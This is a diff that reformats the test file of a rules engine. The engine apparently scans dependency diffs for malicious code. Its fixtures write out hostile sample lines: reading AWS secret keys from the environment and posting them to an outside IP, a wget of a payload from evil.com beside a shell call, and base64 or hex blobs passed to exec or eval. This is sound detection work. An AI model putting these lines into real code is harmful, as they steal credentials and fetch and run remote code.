@@ -1,8 +1,12 @@
 """Comprehensive rules engine tests — all 23 single-line + 5 window patterns."""
 
 from depvet.analyzer.rules import (
-    scan_diff, scan_diff_windowed, scan_diff_full,
-    MALICIOUS_PATTERNS, WINDOW_PATTERNS, SEVERITY_ORDER_RULES,
+    scan_diff,
+    scan_diff_windowed,
+    scan_diff_full,
+    MALICIOUS_PATTERNS,
+    WINDOW_PATTERNS,
+    SEVERITY_ORDER_RULES,
     is_likely_benign,
 )
 from depvet.models.verdict import Severity, FindingCategory
@@ -14,6 +18,7 @@ def make_diff(lines: list[str], path: str = "test.py") -> str:
 
 
 # ─── All single-line patterns ────────────────────────────────────────────────
+
 
 class TestSingleLinePatterns:
     """Each pattern in MALICIOUS_PATTERNS must fire correctly."""
@@ -138,6 +143,7 @@ class TestSingleLinePatterns:
 
 # ─── No false positives on common patterns ────────────────────────────────────
 
+
 class TestNoFalsePositives:
     """Common legitimate code should NOT trigger rules."""
 
@@ -189,66 +195,76 @@ class TestNoFalsePositives:
 
 # ─── All window patterns ──────────────────────────────────────────────────────
 
+
 class TestWindowPatterns:
     def test_base64_exec_chain_fires(self):
-        diff = make_diff([
-            "data = base64.b64decode(PAYLOAD)",
-            "exec(compile(data, '<s>', 'exec'))",
-        ])
+        diff = make_diff(
+            [
+                "data = base64.b64decode(PAYLOAD)",
+                "exec(compile(data, '<s>', 'exec'))",
+            ]
+        )
         m = scan_diff_windowed(diff)
         assert any(r.rule_id == "BASE64_EXEC_CHAIN" for r in m)
 
     def test_env_exfil_chain_fires(self):
-        diff = make_diff([
-            "key = os.environ.get('AWS_SECRET_ACCESS_KEY')",
-            "urllib.request.urlopen('http://1.2.3.4', data=key.encode())",
-        ])
+        diff = make_diff(
+            [
+                "key = os.environ.get('AWS_SECRET_ACCESS_KEY')",
+                "urllib.request.urlopen('http://1.2.3.4', data=key.encode())",
+            ]
+        )
         m = scan_diff_windowed(diff)
         assert any(r.rule_id == "ENV_EXFIL_CHAIN" for r in m)
 
     def test_subprocess_hardcoded_fires(self):
-        diff = make_diff([
-            "subprocess.run(['bash', '-c'], shell=True)",
-            "cmd = 'wget http://evil.com/payload'",
-        ])
+        diff = make_diff(
+            [
+                "subprocess.run(['bash', '-c'], shell=True)",
+                "cmd = 'wget http://evil.com/payload'",
+            ]
+        )
         m = scan_diff_windowed(diff)
         assert any(r.rule_id in ("SUBPROCESS_HARDCODED",) for r in m)
 
     def test_dynamic_import_exec_fires(self):
-        diff = make_diff([
-            "mod = __import__('base64')",
-            "eval(mod.b64decode(data))",
-        ])
+        diff = make_diff(
+            [
+                "mod = __import__('base64')",
+                "eval(mod.b64decode(data))",
+            ]
+        )
         m = scan_diff_windowed(diff)
         assert any(r.rule_id == "DYNAMIC_IMPORT_EXEC" for r in m)
 
     def test_npm_hex_exec_fires(self):
-        diff = make_diff([
-            "const _x = Buffer.from('636f6e736f6c65', 'hex');",
-            "eval(_x.toString());",
-        ], path="index.js")
+        diff = make_diff(
+            [
+                "const _x = Buffer.from('636f6e736f6c65', 'hex');",
+                "eval(_x.toString());",
+            ],
+            path="index.js",
+        )
         m = scan_diff_windowed(diff, "index.js")
         assert any(r.rule_id == "NPM_HEX_EXEC" for r in m)
 
     def test_window_5_lines_catches_chain(self):
         """Patterns separated by 4 lines (within window) should match."""
-        diff = make_diff([
-            "data = base64.b64decode(PAYLOAD)",
-            "# comment 1",
-            "# comment 2",
-            "# comment 3",
-            "exec(compile(data, '<s>', 'exec'))",
-        ])
+        diff = make_diff(
+            [
+                "data = base64.b64decode(PAYLOAD)",
+                "# comment 1",
+                "# comment 2",
+                "# comment 3",
+                "exec(compile(data, '<s>', 'exec'))",
+            ]
+        )
         m = scan_diff_windowed(diff)
         assert any(r.rule_id == "BASE64_EXEC_CHAIN" for r in m)
 
     def test_window_too_far_apart_no_match(self):
         """Patterns separated by more than window size should NOT match."""
-        lines = (
-            ["data = base64.b64decode(PAYLOAD)"]
-            + ["# padding"] * 10
-            + ["exec(data)"]
-        )
+        lines = ["data = base64.b64decode(PAYLOAD)"] + ["# padding"] * 10 + ["exec(data)"]
         diff = make_diff(lines)
         m = scan_diff_windowed(diff)
         chain = [r for r in m if r.rule_id == "BASE64_EXEC_CHAIN"]
@@ -256,6 +272,7 @@ class TestWindowPatterns:
 
 
 # ─── scan_diff_full deduplication and priority ────────────────────────────────
+
 
 class TestScanDiffFull:
     def test_no_duplicate_rule_id_at_same_line(self):
@@ -268,20 +285,24 @@ class TestScanDiffFull:
             seen.add(key)
 
     def test_critical_first_in_results(self):
-        diff = make_diff([
-            "key = os.environ.get('AWS_SECRET_ACCESS_KEY')",
-            "urllib.request.urlopen('http://1.2.3.4', data=key.encode())",
-        ])
+        diff = make_diff(
+            [
+                "key = os.environ.get('AWS_SECRET_ACCESS_KEY')",
+                "urllib.request.urlopen('http://1.2.3.4', data=key.encode())",
+            ]
+        )
         m = scan_diff_full(diff)
         if m:
             # First result should be highest severity
             assert m[0].severity.value in ("CRITICAL", "HIGH")
 
     def test_window_critical_suppresses_medium_same_category(self):
-        diff = make_diff([
-            "data = base64.b64decode(payload)",   # BASE64_DECODE_EXEC = HIGH
-            "exec(compile(data, '<s>', 'exec'))",  # BASE64_EXEC_CHAIN = CRITICAL
-        ])
+        diff = make_diff(
+            [
+                "data = base64.b64decode(payload)",  # BASE64_DECODE_EXEC = HIGH
+                "exec(compile(data, '<s>', 'exec'))",  # BASE64_EXEC_CHAIN = CRITICAL
+            ]
+        )
         m = scan_diff_full(diff)
         obf = [r for r in m if r.category == FindingCategory.OBFUSCATION]
         sevs = {r.severity.value for r in obf}
@@ -291,6 +312,7 @@ class TestScanDiffFull:
 
 
 # ─── is_likely_benign ────────────────────────────────────────────────────────
+
 
 class TestIsLikelyBenign:
     def test_all_comments(self):
@@ -315,6 +337,7 @@ class TestIsLikelyBenign:
 
 # ─── SEVERITY_ORDER_RULES constant ───────────────────────────────────────────
 
+
 def test_severity_order_rules_correct():
     assert SEVERITY_ORDER_RULES[Severity.CRITICAL] > SEVERITY_ORDER_RULES[Severity.HIGH]
     assert SEVERITY_ORDER_RULES[Severity.HIGH] > SEVERITY_ORDER_RULES[Severity.MEDIUM]
@@ -323,6 +346,7 @@ def test_severity_order_rules_correct():
 
 
 # ─── Pattern count sanity ─────────────────────────────────────────────────────
+
 
 def test_malicious_patterns_count():
     """We should have at least 20 single-line patterns."""
